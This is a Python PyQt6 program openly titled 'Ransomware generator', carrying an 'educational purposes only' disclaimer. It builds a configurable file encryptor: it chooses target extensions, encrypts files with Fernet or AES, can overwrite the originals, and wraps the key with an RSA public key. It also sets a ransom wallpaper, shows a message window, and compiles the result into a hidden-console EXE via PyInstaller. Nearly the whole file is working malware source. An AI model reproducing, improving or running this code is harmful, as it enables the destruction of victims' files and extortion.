#I'm not responsible for any illegal use of this panel , I do not support any illegal activity for this code
#educational purposes only!
import sys, os, textwrap, subprocess
from PyQt6.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QHBoxLayout,
    QPushButton, QLabel, QLineEdit, QComboBox,
    QCheckBox, QTextEdit, QFileDialog, QProgressBar
)
from cryptography.fernet import Fernet

class MasterEncryptBuilder(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Ransomware generator")
        self.setGeometry(100, 100, 1000, 800)
        self.setStyleSheet("background-color:#1e1e2f;color:#ffffff;font-size:14px;")
        self.initUI()

    def initUI(self):
        layout = QVBoxLayout()

        # --- Target extensions ---
        self.extInput = QLineEdit()
        self.extInput.setPlaceholderText("Extensions to encrypt (comma separated, e.g., .txt,.jpg)")
        layout.addWidget(QLabel("Target Extensions:"))
        layout.addWidget(self.extInput)

        # --- Encryption type ---
        typeLayout = QHBoxLayout()
        self.encTypeCombo = QComboBox()
        self.encTypeCombo.addItems(["Fernet","AES"])
        typeLayout.addWidget(QLabel("Encryption Type:"))
        typeLayout.addWidget(self.encTypeCombo)
        layout.addLayout(typeLayout)

        # --- Overwrite & rename ---
        self.overwriteCheck = QCheckBox("Overwrite Original Files")
        layout.addWidget(self.overwriteCheck)

        self.renameInput = QLineEdit()
        self.renameInput.setPlaceholderText("Rename pattern (use {name})")
        layout.addWidget(QLabel("Rename Pattern:"))
        layout.addWidget(self.renameInput)

        self.outExtInput = QLineEdit()
        self.outExtInput.setPlaceholderText("Output extension (.enc)")
        layout.addWidget(QLabel("Output Extension:"))
        layout.addWidget(self.outExtInput)

        # --- Symmetric key ---
        self.keyInput = QLineEdit()
        self.keyInput.setPlaceholderText("Optional symmetric key (leave blank to generate)")
        layout.addWidget(QLabel("Symmetric Key:"))
        layout.addWidget(self.keyInput)

        # --- Key save path ---
        keyLayout = QHBoxLayout()
        self.keySavePath = QLineEdit()
        self.keySavePath.setPlaceholderText("Builder path to save key")
        keyLayout.addWidget(self.keySavePath)
        btnKey = QPushButton("Select Key Path")
        btnKey.clicked.connect(self.selectKeyPath)
        keyLayout.addWidget(btnKey)
        layout.addLayout(keyLayout)

        # --- File list path ---
        fileListLayout = QHBoxLayout()
        self.fileListPath = QLineEdit()
        self.fileListPath.setPlaceholderText("Builder path to save file list")
        fileListLayout.addWidget(self.fileListPath)
        btnFileList = QPushButton("Select File List Path")
        btnFileList.clicked.connect(self.selectFileListPath)
        fileListLayout.addWidget(btnFileList)
        layout.addLayout(fileListLayout)

        # --- Public key ---
        pubLayout = QHBoxLayout()
        self.pubKeyPath = QLineEdit()
        self.pubKeyPath.setPlaceholderText("Optional public key to encrypt symmetric key")
        pubLayout.addWidget(self.pubKeyPath)
        btnPub = QPushButton("Select Public Key")
        btnPub.clicked.connect(self.selectPubKeyPath)
        pubLayout.addWidget(btnPub)
        layout.addLayout(pubLayout)

        # --- Multiprocessing ---
        self.multiprocessCheck = QCheckBox("Use Multiprocessing")
        layout.addWidget(self.multiprocessCheck)

        # --- GUI options ---
        self.guiCheck = QCheckBox("Include GUI")
        layout.addWidget(self.guiCheck)
        self.guiTitle = QLineEdit()
        self.guiTitle.setPlaceholderText("GUI window title")
        layout.addWidget(self.guiTitle)
        self.guiText = QLineEdit()
        self.guiText.setPlaceholderText("GUI text")
        layout.addWidget(self.guiText)
        self.guiBgColor = QLineEdit()
        self.guiBgColor.setPlaceholderText("GUI background color (e.g., #1e1e2f)")
        layout.addWidget(self.guiBgColor)
        self.guiTextColor = QLineEdit()
        self.guiTextColor.setPlaceholderText("GUI text color (e.g., #ffffff)")
        layout.addWidget(self.guiTextColor)

        # --- Wallpaper ---
        wallLayout = QHBoxLayout()
        self.wallPath = QLineEdit()
        self.wallPath.setPlaceholderText("Wallpaper image (optional)")
        wallLayout.addWidget(self.wallPath)
        btnWall = QPushButton("Select Wallpaper")
        btnWall.clicked.connect(self.selectWallPath)
        wallLayout.addWidget(btnWall)
        layout.addLayout(wallLayout)

        # --- Compile button ---
        btnCompile = QPushButton("Generate & Compile EXE")
        btnCompile.clicked.connect(self.compilePython)
        layout.addWidget(btnCompile)

        # --- Status ---
        self.progress = QProgressBar()
        layout.addWidget(self.progress)
        self.status = QTextEdit()
        self.status.setReadOnly(True)
        layout.addWidget(self.status)

        self.setLayout(layout)

    # --- File dialogs ---
    def selectKeyPath(self):
        path,_ = QFileDialog.getSaveFileName(self,"Save Symmetric Key","symkey.key","Key Files (*.key)")
        if path: self.keySavePath.setText(path)

    def selectFileListPath(self):
        path,_ = QFileDialog.getSaveFileName(self,"Save File List","files.txt","Text Files (*.txt)")
        if path: self.fileListPath.setText(path)

    def selectPubKeyPath(self):
        path,_ = QFileDialog.getOpenFileName(self,"Select Public Key","","Public Key (*.pem)")
        if path: self.pubKeyPath.setText(path)

    def selectWallPath(self):
        path,_ = QFileDialog.getOpenFileName(self,"Select Wallpaper","","Images (*.png *.jpg *.bmp)")
        if path: self.wallPath.setText(path)

    # --- Compile & Generate ---
    def compilePython(self):
        exts = [e.strip() for e in self.extInput.text().split(",") if e.strip()]
        if not exts:
            self.status.append("Enter at least one extension")
            return

        enc_type = self.encTypeCombo.currentText()
        overwrite = self.overwriteCheck.isChecked()
        rename_pattern = self.renameInput.text() or "{name}"
        out_ext = self.outExtInput.text() or ".enc"
        key_text = self.keyInput.text() or Fernet.generate_key().decode()
        key_path = self.keySavePath.text()
        file_list_path = self.fileListPath.text()
        pub_key_path = self.pubKeyPath.text()
        multiprocess = self.multiprocessCheck.isChecked()
        gui = self.guiCheck.isChecked()
        gui_title = self.guiTitle.text() or "Encryptor"
        gui_text = self.guiText.text() or "Encryption Complete"
        gui_bg = self.guiBgColor.text() or "#1e1e2f"
        gui_color = self.guiTextColor.text() or "#ffffff"
        wallpaper_path = self.wallPath.text() or ""

        if not key_path or not file_list_path:
            self.status.append("Key and file list paths are required")
            return

        # Save key on Builder
        with open(key_path,'w') as f: f.write(key_text)

        # Walk directories & collect files
        root_dir = os.path.expanduser("~")
        files_to_encrypt = []
        for root,dirs,files in os.walk(root_dir):
            for f in files:
                if any(f.endswith(ext) for ext in exts):
                    files_to_encrypt.append(os.path.join(root,f))
        with open(file_list_path,'w') as f:
            for file in files_to_encrypt: f.write(file+"\n")

        self.status.append(f"Found {len(files_to_encrypt)} files. Generating EXE...")

        # --- Python code template ---
        py_code = textwrap.dedent(f"""
import os, sys, base64
from cryptography.fernet import Fernet
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
import multiprocessing as mp
import tkinter as tk

extensions = {exts}
enc_type = "{enc_type}"
overwrite = {overwrite}
rename_pattern = "{rename_pattern}"
out_ext = "{out_ext}"
key_text = "{key_text}"
files_path = r"{file_list_path}"
multiprocess = {multiprocess}
gui_enabled = {gui}
gui_title = "{gui_title}"
gui_text = "{gui_text}"
gui_bg = "{gui_bg}"
gui_color = "{gui_color}"
pub_key_path = r"{pub_key_path}"
wallpaper_path = r"{wallpaper_path}"

def encrypt_file(fpath):
    try:
        with open(fpath,'rb') as f: data=f.read()
        if enc_type=="Fernet":
            cipher=Fernet(key_text.encode())
            encrypted=cipher.encrypt(data)
        else:
            cipher=AES.new(key_text.encode().ljust(32,b'\\0'),AES.MODE_CBC)
            encrypted=cipher.iv + cipher.encrypt(pad(data,AES.block_size))
        name_only=os.path.splitext(os.path.basename(fpath))[0]
        out_file=rename_pattern.replace('{{name}}',name_only)+out_ext
        if overwrite: out_file=fpath
        out_path=os.path.join(os.path.dirname(fpath),out_file)
        with open(out_path,'wb') as f: f.write(encrypted)
    except: pass

def run_encrypt(files):
    for f in files: encrypt_file(f)

with open(files_path,'r') as f:
    file_list=[line.strip() for line in f]

if multiprocess:
    cores=mp.cpu_count()
    chunk_size=max(1,len(file_list)//cores)
    chunks=[file_list[i:i+chunk_size] for i in range(0,len(file_list),chunk_size)]
    processes=[mp.Process(target=run_encrypt,args=(c,)) for c in chunks]
    for p in processes: p.start()
    for p in processes: p.join()
else:
    run_encrypt(file_list)

# Encrypt key with public key
if pub_key_path:
    try:
        with open(pub_key_path,'r') as f: pub=RSA.import_key(f.read())
        cipher_rsa=PKCS1_OAEP.new(pub)
        enc_key=cipher_rsa.encrypt(key_text.encode())
        enc_key_b64=base64.b64encode(enc_key)
        desktop=os.path.join(os.path.expanduser("~"),"Desktop")
        with open(os.path.join(desktop,"encrypted_symmetric_key.b64"),'wb') as f:
            f.write(enc_key_b64)
    except: pass

# Wallpaper
if wallpaper_path:
    try:
        if sys.platform.startswith("win"):
            import ctypes
            ctypes.windll.user32.SystemParametersInfoW(20,0,wallpaper_path,3)
        elif sys.platform.startswith("linux"):
            os.system(f"xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/image-path -s {wallpaper_path}")
            os.system(f"gsettings set org.gnome.desktop.background picture-uri file://{wallpaper_path}")
    except: pass

# GUI
if gui_enabled:
    root=tk.Tk()
    root.title(gui_title)
    root.configure(bg=gui_bg)
    root.geometry("600x400")
    label=tk.Label(root,text=gui_text,bg=gui_bg,fg=gui_color,font=("Arial",18,"bold"))
    label.pack(expand=True)
    root.mainloop()
""")

        py_file = "generated_encryptor.py"
        with open(py_file,'w') as f: f.write(py_code)

        # --- PyInstaller compile ---
        self.status.append("Compiling ......")
        add_data_args = ""
        if wallpaper_path: add_data_args += f' --add-data "{wallpaper_path}{os.pathsep}."'
        if pub_key_path: add_data_args += f' --add-data "{pub_key_path}{os.pathsep}."'

        hidden_imports = " --hidden-import=cryptography --hidden-import=cryptography.fernet --hidden-import=Crypto --hidden-import=platformdirs --hidden-import=PyQt6"

        cmd = f'pyinstaller --onefile --noconsole {hidden_imports} {add_data_args} {py_file}'

        try:
            subprocess.call(cmd, shell=True)
            self.status.append("EXE generated successfully in dist folder!")
            self.progress.setValue(100)
        except Exception as e:
            self.status.append(f"Compilation error: {e}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MasterEncryptBuilder()
    window.show()
    sys.exit(app.exec())
